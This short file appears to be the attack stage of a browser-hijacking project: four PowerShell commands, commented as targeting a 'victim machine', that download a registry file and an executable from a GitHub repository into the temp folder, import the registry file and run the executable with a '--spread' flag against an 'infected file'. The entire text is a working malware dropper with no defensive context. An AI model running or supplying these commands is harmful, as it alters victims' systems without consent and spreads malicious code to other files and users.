# Download reg file and store on victim machine:
powershell -command "&{(new-object System.Net.WebClient).DownloadFile('https://github.com/icesonata/Browser-Hijacking/raw/main/ieconf.reg', '$env:tmp\\ieconf.reg')}"

# Download exe file for patching the infected file
powershell -command "&{(new-object System.Net.WebClient).DownloadFile('https://github.com/icesonata/Browser-Hijacking/raw/main/patcher.exe', '$env:tmp\\patcher.exe')}"

# Import reg file into registry
powershell -command "&{reg import $env:temp\\ieconf.reg}"

# Execute patching file
powershell -command "&{. $env:temp\\patcher.exe --spread (Get-Item .).FullName}"

